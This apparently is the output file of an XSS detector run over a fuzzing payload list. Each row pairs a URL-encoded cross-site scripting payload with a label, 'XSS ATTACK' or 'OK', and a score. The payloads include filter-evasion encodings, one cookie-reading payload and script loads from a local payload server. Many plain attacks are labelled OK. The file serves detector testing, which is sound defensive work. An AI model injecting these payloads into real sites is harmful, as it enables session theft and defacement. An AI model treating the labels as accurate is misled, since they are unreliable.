sentence,result,threshold
%3E%3C/title%3E%3Cscript%3Ealert%28X%29%3C/script%3E%27%22%3E%3Cmarquee%3E%3Ch1%3EKerala%20Cyber%20Force%3C/h1%3E%3C/marquee%3E,OK,0.010029912
%3Ca%20href%3D%22javascript%5Cx0D%3Ajavascript%3Aalert%281%29%22%20id%3D%22fuzzelement1%22%3Etest%3C/a%3E,OK,0.0024856925
%3C/ScrIpt%3E%3CSCRIPT%3Ealert%281%29%3B%3C/SCRIPT%3E,OK,0.0839524269
%27%3E%3CSCRIPT/SRC%3D%22%25%28jscript%29s%22%3E%3C/SCRIPT%3E,XSS ATTACK,0.994774461
%27%3E%3CSTYLE%3E.X%7Bbackground-image%3Aurl%28%22javascript%3Aalert%281%29%22%29%3B%7D%3C/STYLE%3E%3CA%20CLASS%3DX%3E%3C/A%3E,XSS ATTACK,0.990643442
%22%3E%3Cform%20name%3Dself%20location%3D%22javascript%3Aalert%281%29%22,OK,0.197207272
%22%3E%3Cimg%5B%250a%5Donerror%3Dalert%281%29%20src%3Da%3E,XSS ATTACK,0.443561852
%3C/ScrIpt%3E%3Cscript%3Ealert%281%29%3C/script%3E,OK,0.342933565
%22%3E%3CSCRIPT%20SRC%3D%25%28jscript%29s%3F%3CB%3E,XSS ATTACK,0.995004117
%3Cscri%2500pt%3Ealert%281%29%3B%3C/scri%2500pt%3E,OK,0.0510676801
%3C/ScrIpt%3E%3Cscript%3Ealert%25281%2529%3C/script%3E,OK,0.222090364
window%5B%27%5Cx61%5Cx6c%5Cx65%5Cx72%5Cx74%27%5D%28%29,XSS ATTACK,0.997439563
%3C/ScrIpt%3E%3Cscript%3Ealert%281%29%3C/script%3E%22%3E,OK,0.1028409
1%3Canimate/xmlns%3Durn%3Aschemas-microsoft-com%3Atime%20style%3Dbehavior%3Aurl%28%23default%23time2%29%20attributename%3Dinnerhtml%20values%3D%26lt%3Bimg/src%3D%26quot%3B.%26quot%3Bonerror%3Dalert%281%29%26gt%3B%3E,OK,0.00103080273
%3Cscript%20onReadyStateChange%20script%20onReadyStateChange%3D%22javascript%3Ajavascript%3Aalert%281%29%22%3E%3C/script%20onReadyStateChange%3E,OK,0.018625468
%3C/ScrIpt%3E%3Cscript%3EexecScript%28%3FMsgBox%201%3F%2C%3Fvbscript%3F%29%3B%3C/script%3E,OK,0.0135206878
%3C%21a%20foo%3Dx%3D%60y%3E%3Cimg%20alt%3D%22%60%3E%3Cimg%20src%3Dx%3Ax%20onerror%3Dalert%282%29//%22%3E,OK,0.0023240149
%22%3E%3Cx%20style%3D%22behavior%3Aurl%28%25%28sct%29s%29%22%3E,OK,0.0856565535
%3Cscript%20src%3D%22/%5C%25%28jscript%29s%22%3E%3C/script%3E,XSS ATTACK,0.462018579
%27%3E%3Cscript%3Ealert%281%29%3Cscript%3E%3C/script%3E,OK,0.284410208
%22%3E%3CA%20CLASS%3DX%3E%3C/A%3E,XSS ATTACK,0.909582615
%27%3E%3CsVg%3E%3CscRipt%20%2500%3Eprompt%26lpar%3B/,OK,0.0776075125
%3Ciframe%20name%3Dx%3E%3C/iframe%3E%22%3E%3C/iframe%3E%3Ca%20href%3D%22http%3A//127.0.0.1%3A3555/xss_serve_payloads/X.html%22%20target%3Dx%20id%3Dx%3E%3C/a%3E%3Cscript%3Ewindow.onload%3Dfunction%28%29%7Bx.click%28%29%7D%3C/script%3E,OK,0.00056001544
%3C/ScrIpt%3E%3Cscript%3Ealert%281%29%3C/script%3E,OK,0.342933565
%27%3E%3CIFRAME%20SRC%3D%23%20onmouseover%3D%22alert%28document.cookie%29%22%3E%3C/IFRAME%3E,XSS ATTACK,0.994984508
%27%3E%3Cscript%3Ealert%281%29%3C/script%3E,XSS ATTACK,0.478938371
%22%3E%3CSTYLE%20type%3D%22text/css%22%3EBODY%7Bbackground%3Aurl%28%22javascript%3Aalert%28%27X%27%29%22%29%7D%3C/STYLE%3E,XSS ATTACK,0.924440503
a%3D%20%7Bget%5Balert%601%60%5D%28%29%7B%7D%7D,OK,0.168168634
%27%3E%3Cscript%20src%3D%22data%3Atext/javascript%2Calert%281%29%22%3E%3C/script%3E,OK,0.262720376
%22%3E%3CSCRIPT%20%3D%22%3E%22%20SRC%3D%22http%3A//127.0.0.1%3A3555/xss_serve_payloads/X.js%22%3E%3C/SCRIPT%3E,XSS ATTACK,0.637372
%27%3E%3Ca%20href%3D%22%5Cx1Bjavascript%3Ajavascript%3Aalert%281%29%22%20id%3D%22fuzzelement1%22%3Etest%3C/a%3E,OK,0.0263849199
%22%3E%3Cmeta%20charset%3DHZ-GB-2312%3E%3Cscrip%7E%7Dt%3Ealert%281%29%3C/script%3E,OK,0.00556328893
%2522%29%3Balert%281%29%3B//,OK,0.372006
%27%3E%3Cx%20repeat%3D%22template%22%20repeat-start%3D%22999999%22%3E0%3Cy%20repeat%3D%22template%22%20repeat-start%3D%22999999%22%3E1%3C/y%3E%3C/x%3E,OK,0.00386109948
%3Cscript/src%3Ddata%3A%2Calert%281%29%3E,XSS ATTACK,0.992986083
%27%3E%3Cimg%20o%5B%2500%5Dnerror%3Dalert%281%29%20src%3Da%3E,OK,0.0328541696
%27%3E%3Cisindex%20type%3Dimage%20src%3D1%20onerror%3Dalert%281%29%3E,XSS ATTACK,0.993207574
%3Cobject%20data%3Djavascript%3Aalert%281%29%3E,XSS ATTACK,0.995638728
%22%3E%3Ciframe%20src%3D%22data%3Atext/html%2C%253C%2573%2563%2572%2569%2570%2574%253E%2561%256C%2565%2572%2574%2528%2531%2529%253C%252F%2573%2563%2572%2569%2570%2574%253E%22%3E%3C/iframe%3E,XSS ATTACK,0.70643115
%27%3E%3C/style%20%26%2332%3B%3E%3Cscript%20%26%2332%3B%20%3A-%28%3E/%2A%2A/alert%28document.location%29/%2A%2A/%3C/script%20%26%2332%3B%20%3A-%28,OK,0.0083090961
%22%3E%3Cimg%20onerror%3Da%26%23x0006c%3Bert%281%29%20src%3Da%3E,OK,0.00488236547
%27%3E%3CMETA%20HTTP-EQUIV%3D%22refresh%22%20CONTENT%3D%220%3B%20URL%3Dhttp%3A//%3BURL%3Djavascript%3Aalert%28%27X%27%29%3B%22%3E,OK,0.0312877595
eval%28%27%5Cx61ler%5Cx74%281%29%27%29,XSS ATTACK,0.447813243
%22%3E%3CBASE%20HREF%3D%22javascript%3Ajavascript%3Aalert%281%29%3B//%22%3E,XSS ATTACK,0.964164138
%22%3E%3Cimg/onerror%3D%5Cx27javascript%3Aalert%281%29%5Cx27src%3Dxxx%3Ax%20/%3E,OK,0.155375957
%27%3E%3Cimg/onerror%3D%5Cx09javascript%3Aalert%281%29%5Cx09src%3Dxxx%3Ax%20/%3E,OK,0.161445379
%22%3E%3C%3Fxml-stylesheet%20href%3D%22javascript%3Aalert%281%29%22%3F%3E%3Croot/%3E,OK,0.0168408155
%3Csvg%3E%3Cscript%3Ealert%26%2340%201%26%2341,OK,0.0590885
%3C%250bscript%3Ealert%281%29%3B%3C/script%3E,XSS ATTACK,0.486157924
%3Cdiv%20style%3D%22background%3Aurl%28/f%23%26%23127%3Boo/%3Bcolor%3Ared/%2A/foo.jpg%29%3B%22%3EX,OK,0.000597447157
%22%3E%3Ctextarea%20autofocus%20onfocus%3Dalert%281%29%3E,XSS ATTACK,0.810761571
%27%3E%3Cscript%20src%3D%22data%3Atext/plainalert%281%29%22%3E%3C/script%3E,OK,0.38025564
%27%3E%3CTABLE%20BACKGROUND%3D%22javascript%3Aalert%28%27X%27%29%22%3E,XSS ATTACK,0.986252069
%27%3E%3Csvg%3E%3Cscript%3Eprompt%26%2340%201%26%2341%3C/script%3E,OK,0.0127012134
%3Cdiv%20id%3D%22x%22%3Ex%3C/div%3E%20%3Cxml%3Anamespace%20prefix%3D%22t%22%3E%20%3Cimport%20namespace%3D%22t%22%20implementation%3D%22%23default%23time2%22%3E%20%3Ct%3Aset%20attributeName%3D%22innerHTML%22%20targetElement%3D%22x%22%20to%3D%22%26lt%3Bimg%26%2311%3Bsrc%3Dx%3Ax%26%2311%3Bonerror%26%2311%3B%3Djavascript%3Aalert%281%29%26gt%3B%22%3E,OK,2.08353176e-05
%26%23x00027%3B%3B%20confirm%281%29%3B%20%26%23x00027%3B,OK,0.123154372
%3CSCRIPT%3Edocument.write%28%22%3CSCRI%22%29%3B%3C/SCRIPT%3EPT%20SRC%3D%22http%3A//127.0.0.1%3A3555/xss_serve_payloads/bmpz.bmp%22%3E%3C/SCRIPT%3E,XSS ATTACK,0.880889535
%22%3E%3Cform%20action%3D%22javas%26Tab%3Bcript%3Aalert%281%29%22%20method%3D%22get%22%3E%3Cinput%20type%3D%22submit%22%20value%3D%22Submit%22%3E%3C/form%3E,OK,0.00740906596
%2525%2532%2532%2525%2533%2545%2525%2533%2543%2525%2537%2533%2525%2536%2533%2525%2537%2532%2525%2536%2539%2525%2537%2530%2525%2537%2534%2525%2533%2545%2525%2534%2542%2525%2534%2533%2525%2534%2536%2525%2533%2543%2525%2532%2546%2525%2537%2533%2525%2536%2533%2525%2537%2532%2525%2536%2539%2525%2537%2530%2525%2537%2534%2525%2533%2545,OK,0.0408625901
%27%3E%3Ca%20href%3Dj%26%23x00000000041vascr%26%23x00000000069pt%3Aalert%281%29%3EX%3C/a%3E,OK,0.0226300955
%22%3E%3CMETA%20HTTP-EQUIV%3D%22refresh%22%20CONTENT%3D%220%3Burl%3Djavascript%3Aalert%28%27X%27%29%3B%22%3E,OK,0.171334773
%27%3E%3Cscript%3Ealert%281%29%3C/script%3E,XSS ATTACK,0.478938371
%22%3E%3Cscript%3Eif%28%22x%5C%5CxE1%5Cx96%5Cx89%22.length%3D%3D2%29%20%7B%20javascript%3Aalert%281%29%3B%7D%3C/script%3E,OK,0.108900726
%27%3E%3CA%20CLASS%3DX%3E%3C/A%3E,XSS ATTACK,0.913857102
%3C/ScrIpt%3E%3Cscript%3Eprompt%281%29%3C/script%3E,OK,0.204554617
alert%28a.source%29%26lt%3B/SCRIPT%26gt%3B,XSS ATTACK,0.981763601
%27%3E%3Ca%20href%3D%22%5Cx16javascript%3Ajavascript%3Aalert%281%29%22%20id%3D%22fuzzelement1%22%3Etest%3C/a%3E,OK,0.0303013027
window%5B%22alert%22%5D%28%22X%22%29,XSS ATTACK,0.772960901
%22%3E%3C///style///%3E%3Cspan%20%252F%20onmousemove%3D%27alert%26lpar%3B1%26rpar%3B%27%3ESPAN,OK,0.0715654492
%27%3E%3CIMG%20SRC%3D%22javascript%3Aalert%281%29%3B%22%3E,XSS ATTACK,0.882522702
%22%3E%3CSCRIPT%20SRC%3D%22http%3A//127.0.0.1%3A3555/xss_serve_payloads/X.jpg%22%3E%3C/SCRIPT%3E,XSS ATTACK,0.997070432
%22%3E%3Ca%20href%3D%22data%3Atext/html%3Bblabla%2C%26%2360%26%23115%26%2399%26%23114%26%23105%26%23112%26%23116%26%2332%26%23115%26%23114%26%2399%26%2361%26%2334%26%23104%26%23116%26%23116%26%23112%26%2358%26%2347%26%2347%26%23115%26%23116%26%23101%26%23114%26%23110%26%23101%26%23102%26%2397%26%23109%26%23105%26%23108%26%23121%26%2346%26%23110%26%23101%26%23116%26%2347%26%23102%26%23111%26%23111%26%2346%26%23106%26%23115%26%2334%26%2362%26%2360%26%2347%26%23115%26%2399%26%23114%26%23105%26%23112%26%23116%26%2362%26%238203%22%3EX%3C/a%3E,OK,0.0067525804
%22%3E%3Ca%20href%3D%22javascript%5Cx09%3Ajavascript%3Aalert%281%29%22%20id%3D%22fuzzelement1%22%3Etest%3C/a%3E,OK,0.0896015763
%27%60%22%3E%3Cscript%3Ealert%281%29%3C/script%3E,XSS ATTACK,0.960837483
%22%3E%3Cscript%3Ealert%281%29%3C/script%3E,XSS ATTACK,0.474990964
%3C%21--%20--%20--%3E%3Cscript%3Ealert%281%29%3B%3C/script%3E,XSS ATTACK,0.998998284
%27%3E%3Cscript%3Ealert%281%29%3C/script%3E,XSS ATTACK,0.478938371
%3C/ScrIpt%3E%3Cscript%3Ealert%281%29%3C/script%3E,OK,0.342933565
%22%3E%3Ca%20href%3D%22%5CxE2%5Cx80%5CxA8javascript%3Ajavascript%3Aalert%281%29%22%20id%3D%22fuzzelement1%22%3Etest%3C/a%3E,OK,0.0149537027
%26%27%22%3E%5Cuff1c%5Cuff53%5Cuff43%5Cuff52%5Cuff49%5Cuff50%5Cuff54%5Cuff1e%5Cuff41%5Cuff4c%5Cuff45%5Cuff52%5Cuff54%5Cuff08%5Cuff0f%5Cuff58%5Cuff53%5Cuff53%5Cuff0f%5Cuff09%5Cuff1c%5Cuff0f%5Cuff53%5Cuff43%5Cuff52%5Cuff49%5Cuff50%5Cuff54%5Cuff1e,OK,9.04184e-05
%22%3E%3Cscript/src%3Ddata%3A%2Calert%281%29%3E,XSS ATTACK,0.96666038
%27%3E%3CIMG%20SRC%3D%60javascript%3Aalert%281%29%60%3E,XSS ATTACK,0.877456367
%22%3E%3Cb%3E%3Cstyle%3E%3Cstyle/%3E%3Cimg%20src%3Dxx%3A%20onerror%3Dalert%281%29%3E,OK,0.308442056
%22%3E%3Cvideo%20onerror%3D%22javascript%3Aalert%281%29%22%3E%3Csource%3E,OK,0.0454799235
vbscript%26%2300058%3Balert%281%29%3B,XSS ATTACK,0.993295193
%3C/ScrIpt%3E%3Cscript%3Ealert%281%29%3C/script%3E,OK,0.342933565
%3Cbody/onpageshow%3Dalert%281%29%3E,XSS ATTACK,0.993205
%3Cmarquee%3EKerala%20Cyber%20Force%3C/marquee%3E,XSS ATTACK,0.999207377
%22%3E%3Cs%2500c%2500r%2500%2500ip%2500t%3Econfirm%281%29%3B%3C/s%2500c%2500r%2500%2500ip%2500t%3E,OK,0.00359973311
%27%3E%3Cvideo%20onprogress%3Dalert%281%29%3E%3Csource%20src%3D//a.a%3E,OK,0.0257621109
%22%3E%3Ca%20href%3D%22%5CxE2%5Cx81%5Cx9Fjavascript%3Ajavascript%3Aalert%281%29%22%20id%3D%22fuzzelement1%22%3Etest%3C/a%3E,OK,0.0142136812
%3Cscript%20xmlns%3D%22http%3A//www.w3.org/1999/xhtml%22%3Ealert%281%29%3C/script%3E,XSS ATTACK,0.984348774
%27%3E%3Cimage%20name%3Dbody%3E%3Cimage%20name%3DadoptNode%3EX%3Cimage%20name%3DfirstElementChild%3E%3Csvg%20onload%3Dalert%281%29%3E,OK,0.0124771
%3C/ScrIpt%3E%3Cscript%3Ealert%281%29%3C/script%3E,OK,0.342933565
%27%3E%3Cscript%3Ealert%281%29%3C/script%3E,XSS ATTACK,0.478938371
%22%3E%3Cb%20id%3D%22id1%22%20x%3Dbegin0x9fa0end%20%3E%60%27%22%3E%3C/b%3E%3Cscript%3Eif%20%28%21/begin.end/.test%28document.getElementById%28%27id1%27%29.getAttribute%28%27x%27%29%29%29%20%7B%20alert%281%29%3B%7D%3C/script%3E,OK,0.000944137573
%22%3E%3CIMG%20%22%22%22%3E%3CSCRIPT%3Ealert%28%22X%22%29%3C/SCRIPT%3E%22%3E,XSS ATTACK,0.894486189
%22%3E%3C%3Cli%20style%3Dlist-style%3Aurl%28%29%20onerror%3Dalert%281%29%3E%3C/li%3E,OK,0.0202239752
%27%3E%3Cimg%20onerror%3Da%26%23x006c%3Bert%281%29%20src%3Da%3E,OK,0.00456875563
%26lt%3BDIV%20STYLE%3D%22background-image%3A%20url%28javascript%3Aalert%281%29%29%22%26gt%3B,OK,0.0390221477
%3Ca%20href%3D%22javas%5Cx01cript%3Ajavascript%3Aalert%281%29%22%20id%3D%22fuzzelement1%22%3Etest%3C/a%3E,OK,0.00645986199
%27%3E%3Cb%3E%3Cscript%3Cb%3E%3C/b%3E%3Calert%281%29%3C/script%20%3C/b%3E%3C/b%3E%3C/div%3E,OK,0.00767162442
%3CSCRIPT%20SRC%3D%22http%3A//127.0.0.1%3A3555/xss_serve_payloads/X.jpg%22%3E%3C/SCRIPT%3E,XSS ATTACK,0.998205423
%3Ccommand%20onmouseover%3D%22%5Cx6A%5Cx61%5Cx76%5Cx61%5Cx53%5Cx43%5Cx52%5Cx49%5Cx50%5Cx54%5Cx26%5Cx63%5Cx6F%5Cx6C%5Cx6F%5Cx6E%5Cx3B%5Cx63%5Cx6F%5Cx6E%5Cx66%5Cx69%5Cx72%5Cx6D%5Cx26%5Cx6C%5Cx70%5Cx61%5Cx72%5Cx3B%5Cx31%5Cx26%5Cx72%5Cx70%5Cx61%5Cx72%5Cx3B%22%3ESave%3C/command%3E,OK,0.000268697739
%27%3E%3Cscript%3Etry%7Beval%28%22%3C%3E%3C/%3E%22%29%3Balert%281%29%7Dcatch%28e%29%7Balert%281%29%7D%3B%3C/script%3E,XSS ATTACK,0.501840949
%22%3E%3Cform%20action%3D%22Javascript%3Aalert%281%29%22%3E%3Cinput%20type%3Dsubmit%3E,OK,0.00686404109
%27%3E%3Ca%20href%3D%22javas%5Cx08cript%3Ajavascript%3Aalert%281%29%22%20id%3D%22fuzzelement1%22%3Etest%3C/a%3E,OK,0.0912393928
%3C/ScrIpt%3E%3Cscript%3Ealert%281%29/X/%27%3C/script%3E,OK,0.170864344
%3C/ScrIpt%3E%3Cscript%3Ejavascript%3Aalert%281%29%3C/script%3E%22%3E,OK,0.0257362723
%22%3E%3Cx%20%27%3D%22foo%22%3E%3Cx%20foo%3D%27%3E%3Cimg%20src%3Dx%20onerror%3Dalert%281%29//%27%3E,OK,0.000735253096
%22%3E%3Cscript%3E%20chr%3DString.fromCharCode%281%29%3B%20result%3D%27%27%3B%20try%7B%20result%3DencodeURIComponent%28chr%29%3B%20%7Dcatch%28e%29%7B%7D%20if%28%21/%25/.test%28result%29%26%26result.length%29%20%7B%20ids.push%281%29%3B%20%7D%20%3C/script%3E,OK,0.00190073252
%22%3E%3Carticle%20xmlns%3D%22x%3Aimg%20src%3Dx%20onerror%3Dalert%281%29%20%22%3E,XSS ATTACK,0.908823967
this%5B%27ale%27%2B%27%5Cx72%5Cx74%27%5D%28%29,XSS ATTACK,0.723959327
%3C%5B%2500%5Dimg%20onerror%3Dalert%281%29%20src%3Da%3E,XSS ATTACK,0.999455631
%27%3E%3Cobject%20data%3D%22data%3Atext/html%3Bbase64%2C%25%28base64%29s%22%3E,XSS ATTACK,0.819975495
%3Cbody%20onBeforeUnload%20body%20onBeforeUnload%3D%22javascript%3Ajavascript%3Aalert%281%29%22%3E%3C/body%20onBeforeUnload%3E,OK,0.00198280811
%3C/ScrIpt%3E%3Cscript%3E/%2A%20%2A/alert%281%29//%20%2A/%3C/script%3E,OK,0.00936451554
%3Clisting%3E%26ltimg%20src%3Dx%20onerror%3Dalert%281%29%26gt%3C/listing%3E,XSS ATTACK,0.918915629
-prompt%281%29-,OK,0.293501228
%22%3E%3Cimg%20o%5B%2500%5Dnerror%3Dalert%281%29%20src%3Da%3E,OK,0.0324331224
%3Ctable%20background%3D%22javascript%3Aalert%2832%29%22%3E%3C/table%3E,OK,0.0777735412
%22%3E%3Cimg%20src%5Cx09%3Dx%20onerror%3D%22javascript%3Aalert%281%29%22%3E,OK,0.00243204832
%22%3E%3Ca%20href%3D%22%5Cx1Ajavascript%3Ajavascript%3Aalert%281%29%22%20id%3D%22fuzzelement1%22%3Etest%3C/a%3E,OK,0.0260671675
%22%3E%3Ca%20href%3D%22%5CxE2%5Cx80%5Cx84javascript%3Ajavascript%3Aalert%281%29%22%20id%3D%22fuzzelement1%22%3Etest%3C/a%3E,OK,0.0148259699
%3C/ScrIpt%3E%3Cscript%3Ejavascript%3Aalert%281%29%3C/script%3E,OK,0.038064003
%2525%2532%2535%2525%2533%2532%2525%2533%2532%2525%2532%2535%2525%2533%2533%2525%2534%2535%2525%2532%2535%2525%2533%2533%2525%2534%2533%2525%2532%2535%2525%2533%2537%2525%2533%2533%2525%2532%2535%2525%2533%2536%2525%2533%2533%2525%2532%2535%2525%2533%2537%2525%2533%2532%2525%2532%2535%2525%2533%2536%2525%2533%2539%2525%2532%2535%2525%2533%2537%2525%2533%2530%2525%2532%2535%2525%2533%2537%2525%2533%2534%2525%2532%2535%2525%2533%2533%2525%2534%2535%2525%2532%2535%2525%2533%2534%2525%2534%2532%2525%2532%2535%2525%2533%2534%2525%2533%2533%2525%2532%2535%2525%2533%2534%2525%2533%2536%2525%2532%2535%2525%2533%2533%2525%2534%2533%2525%2532%2535%2525%2533%2532%2525%2534%2536%2525%2532%2535%2525%2533%2537%2525%2533%2533%2525%2532%2535%2525%2533%2536%2525%2533%2533%2525%2532%2535%2525%2533%2537%2525%2533%2532%2525%2532%2535%2525%2533%2536%2525%2533%2539%2525%2532%2535%2525%2533%2537%2525%2533%2530%2525%2532%2535%2525%2533%2537%2525%2533%2534%2525%2532%2535%2525%2533%2533%2525%2534%2535,OK,0.000633329153
%3C/ScrIpt%3E%3Cscript%3Eeval%28String.fromCharCode%2875%2C67%2C70%29%29%3B%3C/script%3E,OK,0.0193609893
%22%3E%3Cs%5BNULL%5Dcript%3Ealert%281%29%3C/s%5BNULL%5Dcript%3E%27%3EX%3C/a%3E,OK,0.0850009918
%27%3E%3Cevent-source%20src%3D%22%25%28event%29s%22%20onload%3D%22javascript%3Aalert%281%29%22%3E,OK,0.226731241
%3C/ScrIpt%3E%3Cscript%3Ealert%28/X/%29%3C/script%3E,OK,0.252788
%27%3E%3Ctextarea%20autofocus%20onfocus%3Dalert%281%29%3E,XSS ATTACK,0.814217865
%27%3E%3Csvg%3E%3Cstyle%3E%26ltimg%20src%3Dx%20onerror%3Dalert%281%29%26gt%3C/svg%3E,OK,0.00379294157
%27%3E%3Cimg%5Ba%5D%5Bb%5D%5Bc%5Dsrc%5Bd%5D%3Dx%5Be%5Donerror%3D%5Bf%5D%22alert%281%29%22%3E,OK,0.00800207257
%3Ctable%20background%3Djavascript%3Aalert%281%29%3E%3C/table%3E,OK,0.0836378038
%27%3E%3Ca%20href%3D%22javas%5Cx0Bcript%3Ajavascript%3Aalert%281%29%22%20id%3D%22fuzzelement1%22%3Etest%3C/a%3E,OK,0.0885531
%3Ca%20href%3D%22invalid%3A1%22%20id%3Dx%20name%3Dy%3Etest%3C/a%3E%3Ca%20href%3D%22invalid%3A2%22%20id%3Dx%20name%3Dy%3Etest%3C/a%3E%3Cscript%3Ealert%28x.y%5B0%5D%29%3C/script%3E,OK,0.00201269984
%22%3E%3Cscript%3Edocument.write%28toStaticHTML%28%22%3Cstyle%3Ediv%7Bfont-family%3Argb%28%270%2C0%2C0%29%27%27%27%7Dfoo%27%29%3Bcolor%3Dexpression%28alert%281%29%29%3B%7B%7D%3C/style%3E%3Cdiv%3EPOC%3C/div%3E%22%29%29%3C/script%3E,OK,0.00159993768
width%26%23x3A%3Bex/%2A%2A/pression%26%23x28%3Bprompt%26%23x28%3B1%26%23x29%3B%26%23x29%3B,OK,0.07395643
%3Cscript%3Ethis%5B%22alert%22%5D%28%22X%22%29%3C/script%3E,XSS ATTACK,0.965622783
%22%3E%3Ciframe%20src%3Djavascript%26colon%3Balert%26lpar%3Bdocument%26period%3Blocation%26rpar%3B%3E,OK,0.240081519
%27%3E%3Cscript%5Cx0Atype%3D%22text/javascript%22%3Ejavascript%3Aalert%281%29%3B%3C/script%3E,OK,0.0732021928
%27%3E%3C--%60%3Cimg/src%3D%60%20onerror%3Dalert%281%29%3E%20--%21%3E,XSS ATTACK,0.998748899
%22%3E%3CSCRIPT%20%3D%22%3E%22%20SRC%3D%22http%3A//127.0.0.1%3A3555/xss_serve_payloads/bmpz.bmp%22%3E%3C/SCRIPT%3E,XSS ATTACK,0.887060165
%27%3E%3CSTYLE%3Eli%20%7Blist-style-image%3A%20url%28%22javascript%3Ajavascript%3Aalert%281%29%22%29%3B%7D%3C/STYLE%3E%3CUL%3E%3CLI%3EX,XSS ATTACK,0.997425914
%22%3E%3Cimg%20onerror%3D%3Fvbs%3AMsgBox%201%3F%20src%3Da%3E,OK,0.0142520666
%3Ca%20href%3D%22%5Cx1Ajavascript%3Ajavascript%3Aalert%281%29%22%20id%3D%22fuzzelement1%22%3Etest%3C/a%3E,OK,0.00348946452
%27%3E%3CBR%20SIZE%3D%22%26%7Balert%28%27X%27%29%7D%22%3E,XSS ATTACK,0.745520532
%22%3E%3Cbody%20onPopState%20body%20onPopState%3D%22javascript%3Ajavascript%3Aalert%281%29%22%3E%3C/body%20onPopState%3E,OK,0.0871218145
%22%3E%3Ciframe%20src%3Dmhtml%3Ahttp%3A//127.0.0.1%3A3555/xss_serve_payloads/X.html%21X.html%3E%3C/iframe%3E,OK,0.318954825
%22%3E%3CSCRIPT/SRC%3D%22http%3A//127.0.0.1%3A3555/xss_serve_payloads/bmpz.bmp%22%3E%3C/SCRIPT%3E,XSS ATTACK,0.997439742
jAvAsCrIpT%26colon%3Bprompt%26lpar%3B1%26rpar%3B,XSS ATTACK,0.997840524
%3C/ScrIpt%3E%3Cscript%3Ealert%281%29%3C/script%3E,OK,0.342933565
%22%3E%3Cvideo/onprogress%3Dalert%281%29%3E%3Csource/src%3D//a.a%3E,XSS ATTACK,0.499086797
%3Cdiv%20style%3D%22width%3A%20expression%28alert%281%29%3B%29%3B%22%3E,OK,0.0244167745
%26lt%3BIFRAME%20SRC%3D%22javascript%3Aalert%281%29%3B%22%26gt%3B%26lt%3B/IFRAME%26gt%3B,OK,0.0186609626
%27%3E%3C/script%3E%22//%27//%3Csvg%250Aonload%3Dalert%281%29//%3E,XSS ATTACK,0.545804441
%3C/ScrIpt%3E%3Cscript%3Eeval%28%3Fal%3F%2B%3Fert%281%29%3F%29%3B%3C/script%3E,OK,0.0477485359
%3CIFRAME%20SRC%3D%22javascript%3Aalert%28%27X%27%29%3B%22%3E%3C/IFRAME%3E,XSS ATTACK,0.994289041
%27%3E%3Clink%20rel%3Dstylesheet%20href%3Ddata%3A%2C%2A%257bx%3Aexpression%28write%281%29%29%257d,OK,0.00301858783
%3C%21%20foo%3D%22%5B%5B%5BInception%5D%5D%22%3E%3Cx%20foo%3D%22%5Dfoo%3E%3Cscript%3Ealert%281%29%3C/script%3E,OK,0.00208985806
%3C/ScrIpt%3E%3Cscript%3Ealert%601%60%3C/script%3E,OK,0.3359074
%27%3E%3Ca%20style%3D%22pointer-events%3Anone%3Bposition%3Aabsolute%3B%22%3E%3Ca%20style%3D%22position%3Aabsolute%3B%22%20onclick%3D%22javascript%3Aalert%281%29%3B%22%3EX%3C/a%3E%3C/a%3E%3Ca%20href%3D%22javascript%3Ajavascript%3Aalert%281%29%22%3EX%3C/a%3E%3Cstyle%3E%2A%5B%7B%7D%40import%27%25%28css%29s%3F%5D%3C/style%3EX,OK,0.000114041293
%22%60%27%3E%3Cscript%3E%5Cx3Bjavascript%3Aalert%281%29%3C/script%3E,XSS ATTACK,0.951334715
%22%3E%3Cmeta%20http-equiv%3D%22refresh%22%20content%3D%220%3Bjavascript%26colon%3Balert%281%29%22/%3E,OK,0.00422102213
ABC%3Cdiv%20style%3D%22x%3A%5Cx0Aexpression%28javascript%3Aalert%281%29%22%3EDEF,OK,0.0107445717
%26lt%3BIMG%20%22%22%22%26gt%3B%26lt%3BSCRIPT%26gt%3Balert%281%29%26lt%3B/SCRIPT%26gt%3B%22%26gt%3B,OK,0.0294184685
%27%3E%3Cstyle%3Ep%5Bfoo%3Dbar%7B%7D%2A%7B-o-link%3A%27javascript%3Aalert%281%29%27%7D%7B%7D%2A%7B-o-link-source%3Acurrent%7D%2A%7Bbackground%3Ared%7D%5D%7Bbackground%3Agreen%7D%3B%3C/style%3E,OK,0.142359465
%22%3E%3Ca%20href%3D%22javascript%3Avoid%280%29%22%20onmouseover%3D%26NewLine%3Bjavascript%3Aalert%281%29%26NewLine%3B%3EX%3C/a%3E,OK,0.00357121229
